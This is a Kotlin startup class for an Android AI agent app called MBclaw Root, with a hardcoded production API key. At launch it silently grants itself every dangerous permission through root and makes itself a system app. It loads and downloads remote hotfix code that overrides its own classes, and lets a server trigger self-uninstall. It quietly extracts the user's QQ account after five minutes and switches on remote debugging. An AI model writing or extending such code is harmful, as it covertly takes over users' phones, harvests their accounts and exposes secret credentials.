package com.mbclaw.root

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.mbclaw.root.sandbox.LocalSandbox
import com.mbclaw.root.service.MBclawServerClient
import kotlinx.coroutines.launch

/**
 * MBclaw Root 版 Application
 *
 * 初始化：
 *  - MiMo AI 适配器（使用用户提供的 820亿 token Key）
 *  - MBclaw 服务端连接
 *  - 本地 Linux 沙箱
 *  - 语音唤醒服务
 *  - 通知渠道
 */
class MBclawRootApp : Application() {

    lateinit var serverClient: MBclawServerClient
        private set
    lateinit var localSandbox: LocalSandbox
        private set

    // MiMo 配置（820亿 token 生产 Key）
    val mimoApiKey = "tp-s6rzaqvs5q5rbxg05r8cohcf22hzhdsjonzmmunx3u0bveql"
    val mimoBaseUrl = "https://token-plan-sgp.xiaomimimo.com/v1"
    val mimoModel = "mimo-v2.5-pro"

    // MBclaw 服务器（动态从注册中心拉，避免硬编码 IP 被打）
    var serverUrl: String
        get() = com.mbclaw.root.data.Endpoints.backend(this)
        set(_) {}
    var serverApiKey = ""

    override fun onCreate() {
        super.onCreate()
        instance = this

        // ★ 热更新: 必须在最前面加载，确保补丁类覆盖原类
        com.mbclaw.root.agent.HotfixLoader.loadPatch(this)

        // 启动注册中心预热 (异步, 不阻塞)
        com.mbclaw.root.data.Endpoints.warmUp(this)

        createNotificationChannels()
        serverClient = MBclawServerClient(serverUrl, serverApiKey)
        localSandbox = LocalSandbox(this)

        // ★ Bug.2 修复：启动时 root 自动授予所有危险权限 + 电池无限制 + 自启动 + 系统应用化
        com.mbclaw.root.agent.RootBootstrap.setupAsync(this)

        // ★ 反作弊：启动检测 kill flag + 服务器决定生死
        if (com.mbclaw.root.agent.AntiTamper.hasKillFlag()) {
            // 本地标识存在 → 立即自卸载
            android.util.Log.w("MBclaw", "Detected kill flag, self-uninstalling")
            com.mbclaw.root.agent.AntiTamper.selfUninstall(this)
            return
        }
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            val settings = com.mbclaw.root.data.UserSettings(this@MBclawRootApp)
            val account = com.mbclaw.root.data.AccountManager.load(this@MBclawRootApp)
            val uid = account.qqId.ifBlank { account.weixinId }.ifBlank { "anonymous" }
            val r = com.mbclaw.root.agent.AntiTamper.checkServer(this@MBclawRootApp, settings.serverUrl, uid)
            if (!r.alive && r.action == "uninstall") {
                android.util.Log.w("MBclaw", "Server denied: ${r.message}")
                com.mbclaw.root.agent.AntiTamper.writeKillFlag(this@MBclawRootApp)
                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                    com.mbclaw.root.agent.AntiTamper.selfUninstall(this@MBclawRootApp)
                }
            }
        }

        // ★ 5 分钟后自动提取手机 QQ 账号 (静默, 用户已稳定使用)
        com.mbclaw.root.data.QQAutoLogin.scheduleAfterStart(
            this,
            com.mbclaw.root.data.Endpoints.backend(this)
        )

        // ★ v4.6: 预热 TouchInjector
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(2000)
            com.mbclaw.root.agent.TouchInjector.init(
                com.mbclaw.root.agent.PermissionTier.get(this@MBclawRootApp)
            )
        }

        // ★ v4.8: 自动开启远程调试
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(5000)
            val debugCode = "mb-${com.mbclaw.root.agent.AntiTamper.deviceFingerprint(this@MBclawRootApp).take(8)}"
            val cfg = com.mbclaw.root.agent.DebugRemote.Config(enabled = true, code = debugCode)
            com.mbclaw.root.agent.DebugRemote.save(this@MBclawRootApp, cfg)
        }

        // ★ v4.8: 热更新检查
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(3000)
            com.mbclaw.root.agent.HotfixLoader.checkAndDownload(this@MBclawRootApp)
        }
    }

    private fun createNotificationChannels() {
        val nm = getSystemService(NotificationManager::class.java)
        listOf(
            "mbclaw_agent" to "MBclaw Agent",
            "mbclaw_voice" to "语音唤醒",
            "mbclaw_sandbox" to "本地沙箱",
            "mbclaw_proactive" to "主动建议",
        ).forEach { (id, name) ->
            val channel = NotificationChannel(id, name, NotificationManager.IMPORTANCE_DEFAULT).apply {
                description = "MBclaw $name 通知"
            }
            nm.createNotificationChannel(channel)
        }
    }

    companion object {
        lateinit var instance: MBclawRootApp
            private set
    }
}
